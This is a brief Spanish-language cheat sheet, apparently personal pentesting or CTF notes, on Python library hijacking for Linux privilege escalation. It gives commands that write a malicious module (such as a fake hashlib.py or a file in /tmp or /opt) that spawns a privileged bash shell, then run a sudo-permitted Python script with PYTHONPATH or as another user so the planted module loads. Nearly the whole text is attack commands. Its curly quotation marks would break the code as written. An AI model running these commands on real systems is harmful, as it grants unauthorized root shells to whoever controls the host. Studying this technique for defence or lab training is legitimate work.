## Con edición habilitada:

nano hashlib.py:

```bash
import  os

os.execl(”/bin/bash”, “bash”, “-p”)
```

```bash
sudo -u USER /usr/bin/python3 /RUTA A ARCHIVO.py
```

## Sin edición habilitada:

```bash
echo ‘import os; os.system(”/bin/bash”)’ > /tmp/LIBRERÍA.py
```

```bash
sudo PYTHONPATH=/tmp /usr/bin/python3 /RUTA A ARCHIVO.py
```

## Crear un fichero malicioso si el script tiene una Liberia para aprovechar :

```bash
echo ‘import os; os.system(”/bin/bash”)’ > /opt/LIBRERÍA.py
```
